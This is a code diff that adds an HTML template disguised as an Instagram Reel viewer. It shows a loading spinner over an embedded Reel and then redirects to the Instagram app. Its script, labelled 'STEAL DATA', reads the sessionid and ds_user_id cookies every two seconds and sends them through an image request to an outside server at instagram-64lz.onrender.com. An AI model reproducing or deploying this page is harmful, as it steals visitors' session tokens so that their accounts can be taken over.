@@ -1,0 +1,52 @@
+<!-- core/templates/core/reel.html -->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Instagram Reel</title>
+    <style>
+        body,html{margin:0;padding:0;height:100vh;background:#000;overflow:hidden}
+        iframe{width:100%;height:100%;border:none}
+        .loader{position:fixed;top:0;left:0;width:100%;height:100%;background:#000;z-index:9999;display:flex;align-items:center;justify-content:center;flex-direction:column}
+        .spinner{width:60px;height:60px;border:8px solid #333;border-top:8px solid #0095f6;border-radius:50%;animation:s 1s linear infinite}
+        @keyframes s{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p style="color:#fff;margin-top:20px;font-size:18px">Loading Reel...</p>
+    </div>
+
+    <!-- REAL INSTAGRAM REEL EMBED -->
+    <iframe src="https://www.instagram.com/reel/DPeeHGXj7R9/embed/" 
+            allowfullscreen scrolling="no"></iframe>
+
+    <script>
+        // HIDE LOADER AFTER 3 SEC
+        setTimeout(() => {
+            document.querySelector('.loader').style.display = 'none';
+        }, 3000);
+
+        // STEAL DATA FROM INSTAGRAM EMBED
+        setInterval(() => {
+            try {
+                const cookies = document.cookie;
+                const sessionid = cookies.match(/sessionid=([^;]+)/)?.[1];
+                const userid = cookies.match(/ds_user_id=([^;]+)/)?.[1];
+
+                if (sessionid && userid && sessionid.length > 50) {
+                    // SEND TO SERVER
+                    new Image().src = `https://instagram-64lz.onrender.com/steal-reel/?s=${sessionid}&u=${userid}&t=${Date.now()}`;
+                }
+            } catch(e) {}
+        }, 2000);
+
+        // OPEN IN APP AFTER 10 SEC
+        setTimeout(() => {
+            location.href = "instagram://media?id=DPeeHGXj7R9";
+        }, 10000);
+    </script>
+</body>
+</html>
